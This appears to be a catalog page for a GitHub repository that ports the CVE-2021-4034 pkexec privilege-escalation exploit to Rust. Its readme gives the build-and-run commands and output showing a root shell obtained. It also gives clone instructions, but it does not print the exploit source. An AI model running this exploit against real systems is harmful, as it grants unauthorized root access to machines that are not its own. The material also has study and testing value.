# cve-2021-4034

port of CVE-2021-4034 exploit to Rust/cargo for my own edification

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/defhacks](https://github.com/defhacks) |
| Url      | [https://github.com/defhacks/cve-2021-4034](https://github.com/defhacks/cve-2021-4034)                                               |
| Stars    | 1                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

### CVE-2021-4034 exploit but in rust, cause why not ?

Based on https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c

```
$ ./download-and-unpack-vulnerable-pkexec.sh
*optionally enable setuid/setgid for testing*
$ cargo run --bin prep && cd playground && cargo run --bin pwn
    Finished dev [unoptimized + debuginfo] target(s) in 0.00s
     Running `target/debug/prep`
    Finished dev [unoptimized + debuginfo] target(s) in 0.00s
     Running `/home/defhacks/hack/cve-2021-4034/target/debug/pwn`
gconv() called
sh-5.1# /bin/id
uid=0(root) gid=1000(defhacks) groups=1000(defhacks)
sh-5.1#
```



## Get the content

```
git clone https://github.com/defhacks/cve-2021-4034
cd cve-2021-4034
```

{% embed url="https://github.com/defhacks/cve-2021-4034" %}

<figure><img src="https://avatars.githubusercontent.com/u/4090053?v=4" alt=""><figcaption><p>defhacks</p></figcaption></figure>
